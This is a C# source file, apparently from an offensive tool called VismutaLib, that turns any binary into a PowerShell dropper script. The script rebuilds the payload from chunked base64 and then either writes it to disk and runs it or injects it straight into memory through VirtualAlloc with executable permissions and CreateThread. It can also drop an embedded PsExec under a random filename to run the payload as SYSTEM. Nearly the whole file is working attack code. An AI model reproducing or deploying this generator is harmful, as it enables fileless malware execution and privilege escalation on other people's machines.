using System;
using System.Collections.Generic;
using System.Linq;
using VismutaLib.Properties;

namespace VismutaLib
{
    public class Vismuta
    {
        public const String CRLF = "\r\n"; //Always use target environment (PS) line breaks rather than calling environment
        private static readonly Random Random = new Random();
        public const Int32 ZipStrength = 9; //0-9
        public const Int32 RandomFilenameLength = 8;

        public static String Muta(DeployMethodFlags deployFlags, Byte[] srcBinary, String payloadName,
            String payloadExt, String payloadArgs)
        {
            if (srcBinary == null)
                throw new ArgumentNullException(nameof(srcBinary));
            if (String.IsNullOrWhiteSpace(payloadName))
                throw new ArgumentNullException(nameof(payloadName));
            if(payloadExt == null)
                throw new ArgumentNullException(nameof(payloadExt));
            if(payloadArgs == null)
                throw new ArgumentNullException(nameof(payloadArgs));

            if (!IsValidDeployMethod(deployFlags))
                throw new InvalidOperationException("Invalid combination of options");

            String dstShell = String.Empty;
            String execName = GetRandomString(RandomFilenameLength, false);
            String srcEncoded = Convert.ToBase64String(srcBinary, Base64FormattingOptions.None);

            //Deploy PSExec
            if (deployFlags.HasFlag(DeployMethodFlags.PsExec))
            {
                dstShell += "[string] $execEncoded = \"\"; " + CRLF;
                foreach (String execChunk in ChunkString(Resources.ExecEncoded))
                    dstShell += $"$execEncoded += \"{execChunk}\"; " + CRLF;
                dstShell += "[byte[]] $exec = [System.Convert]::FromBase64String($execEncoded); " + CRLF;
                dstShell += $"[System.IO.File]::WriteAllBytes(\"{execName}.exe\", $exec); " + CRLF;
            }

            //Deploy Payload
            dstShell += "[string] $payloadEncoded = \"\"; " + CRLF;
            foreach (String payloadChunk in ChunkString(srcEncoded))
                dstShell += $"$payloadEncoded += \"{payloadChunk}\"; " + CRLF;
            dstShell += "[byte[]] $payload = [System.Convert]::FromBase64String($payloadEncoded); " + CRLF;

            if (deployFlags.HasFlag(DeployMethodFlags.Inject))
            {
                if(deployFlags.HasFlag(DeployMethodFlags.Deflate))
                    throw new InvalidOperationException("You cannot inject multiple files in to memory!");

                dstShell += "$apidef = \"[DllImport(`\"kernel32.dll`\")]\";" + CRLF;
                dstShell += "$apidef += \"`r`npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\";" + CRLF;
                dstShell += "$apidef += \"`r`n[DllImport(`\"kernel32.dll`\")]\";" + CRLF;
                dstShell += "$apidef += \"`r`npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\";" + CRLF;
                dstShell += "$apidef += \"`r`n[DllImport(`\"msvcrt.dll`\")]\";" + CRLF;
                dstShell += "$apidef += \"`r`npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);\";" + CRLF;

                dstShell += "$invokeobj = Add-Type -memberDefinition $apidef -Name \"Win32\" -namespace Win32Functions -passthru;" + CRLF;
                dstShell += "$memalloc = $invokeobj::VirtualAlloc(0,[Math]::Max($payload.Length,0x1000),0x3000,0x40);" + CRLF;
                dstShell += "for ($i=0;$i -le($payload.Length-1);$i++) { $invokeobj::memset([IntPtr]($memalloc.ToInt32()+$i), $payload[$i], 1) | Out-Null };" + CRLF;
                dstShell += "$invokeobj::CreateThread(0,0,$memalloc,0,0,0);" + CRLF;
            }
            else
            {
                dstShell += $"[System.IO.File]::WriteAllBytes(\"./{payloadName}{payloadExt}\", $payload); " + CRLF;
            }


            //Sanity checks
            if (deployFlags.HasFlag(DeployMethodFlags.RunAfterDeploy) && deployFlags.HasFlag(DeployMethodFlags.Deflate))
                throw new InvalidOperationException("Presently you can only deploy multiple files, not run them");

            //Unzip Payload
            if (deployFlags.HasFlag(DeployMethodFlags.Deflate))
            {
                dstShell += "Add-Type -AssemblyName System.IO.Compression.FileSystem; " + CRLF;
                dstShell += $"[System.IO.Compression.ZipFile]::ExtractToDirectory(\"./{payloadName}{payloadExt}\", \".\"); " + CRLF;
            }

            //Sanity checks
            if (deployFlags.HasFlag(DeployMethodFlags.Inject) && deployFlags.HasFlag(DeployMethodFlags.PsExec))
                throw new InvalidOperationException("Cannot attempt to run a memory injected payload as SYSTEM (no file to run!)");
            if (deployFlags.HasFlag(DeployMethodFlags.Inject) && deployFlags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                throw new InvalidOperationException("Cannot attempt to run a memory injected payload (no file to run!)");
            

            //Run payload/PSExec
            if (deployFlags.HasFlag(DeployMethodFlags.RunAfterDeploy))
            {
                if (deployFlags.HasFlag(DeployMethodFlags.PsExec))
                    dstShell += $"./{execName}.exe -i -s -d -accepteula cmd /K \"{payloadName}{payloadExt} {payloadArgs}\"; " + CRLF;
                else
                    dstShell += $"./{payloadName}{payloadExt} {payloadArgs}; " + CRLF;
            }
            return dstShell;
        }

        public static Boolean IsValidDeployMethod(DeployMethodFlags flags)
        {
            //Can't PSExec if we don't execute
            if (flags.HasFlag(DeployMethodFlags.PsExec) && !flags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                return false;
            //Deflate presently only happens for multiple files; we won't run them all
            if (flags.HasFlag(DeployMethodFlags.Deflate) && flags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                return false;
            //Lots of things we can't do when injecting in to memory
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                return false;
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.PsExec))
                return false;
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.Deflate))
                return false;
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.ObfuscateName))
                return false;

            //Uh.. this isn't implemented yet...
            if (flags.HasFlag(DeployMethodFlags.EncryptPayload))
                throw new NotImplementedException("Encryption isn't implemented yet");

            return true;
        }

        //Useful for generating filenames
        public static String GetRandomString(Int32 length, Boolean onlyLowercase)
        {
            const String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            const String lowercase = "abcdefghijklmnopqrstuvwxyz";
            return new String(Enumerable.Repeat(onlyLowercase ? lowercase : chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
        }

        private static IEnumerable<String> ChunkString(String input)
        {
            const Int32 chunkSize = 4096; //This is a sweet spot between speed (larger is better) and reliability (much more and PS hurls)
            Int32 curLoc = 0;
            while (curLoc < input.Length)
            {
                Int32 take = Math.Min(chunkSize, input.Length - curLoc);
                String execChunk = new String(input.Skip(curLoc).Take(take).ToArray());
                yield return execChunk;
                curLoc += take;
            }
        }
    }
}
